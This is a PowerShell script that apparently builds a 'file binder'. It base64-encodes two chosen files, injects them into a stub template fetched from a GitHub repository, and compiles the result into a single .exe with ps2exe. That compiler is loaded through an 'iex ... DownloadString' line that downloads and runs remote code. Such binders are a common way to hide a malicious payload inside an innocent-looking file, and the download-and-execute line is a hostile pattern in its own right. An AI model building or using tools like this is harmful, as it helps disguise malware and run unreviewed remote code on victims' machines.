param(
    [string]$file1 = $(Read-Host "Enter the path for file1"),
    [string]$file2 = $(Read-Host "Enter the path for file2"),
    [bool]$remove = $(Read-Host "Remove temporary files after execution? (true/false)" -as [bool])
)

function Get-Base64Content {
    param (
        [string]$filePath
    )
    [Convert]::ToBase64String([System.IO.File]::ReadAllBytes($filePath))
}

function Replace-Placeholders {
    param (
        [string]$templateContent,
        [string]$base64File1,
        [string]$base64File2,
        [string]$fileEnding1,
        [string]$fileEnding2
    )
    $templateContent = $templateContent -replace "BASE64ENCODEDSTUFFHERE1", $base64File1
    $templateContent = $templateContent -replace "BASE64ENCODEDSTUFFHERE2", $base64File2
    $templateContent = $templateContent -replace "YOUR_FILE_ENDING_HERE1", $fileEnding1
    $templateContent = $templateContent -replace "YOUR_FILE_ENDING_HERE2", $fileEnding2
    return $templateContent
}

function Build-Script {
    param (
        [string]$file1,
        [string]$file2,
        [bool]$remove
    )
    $templateUrl = "https://raw.githubusercontent.com/werearecat/binder-file/main/stub.ps1"
    $templateContent = Invoke-RestMethod -Uri $templateUrl

    $base64File1 = Get-Base64Content -filePath $file1
    $base64File2 = Get-Base64Content -filePath $file2

    $fileEnding1 = [System.IO.Path]::GetExtension($file1).TrimStart('.')
    $fileEnding2 = [System.IO.Path]::GetExtension($file2).TrimStart('.')

    $finalScript = Replace-Placeholders -templateContent $templateContent -base64File1 $base64File1 -base64File2 $base64File2 -fileEnding1 $fileEnding1 -fileEnding2 $fileEnding2

    $outputPath = "final_script.ps1"
    Set-Content -Path $outputPath -Value $finalScript -Encoding UTF8

    Write-Host "Script built successfully. Output file: $outputPath"

    # Download and run ps2exe to convert the script to an executable
    iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MScholtes/PS2EXE/master/Module/ps2exe.ps1')
    Invoke-ps2exe -inputFilePath $outputPath -outputFilePath "$outputPath.exe" -NoLogo -NoOutput
    Write-Host "Executable created successfully. Output file: $outputPath.exe"
}

Build-Script -file1 $file1 -file2 $file2 -remove $remove
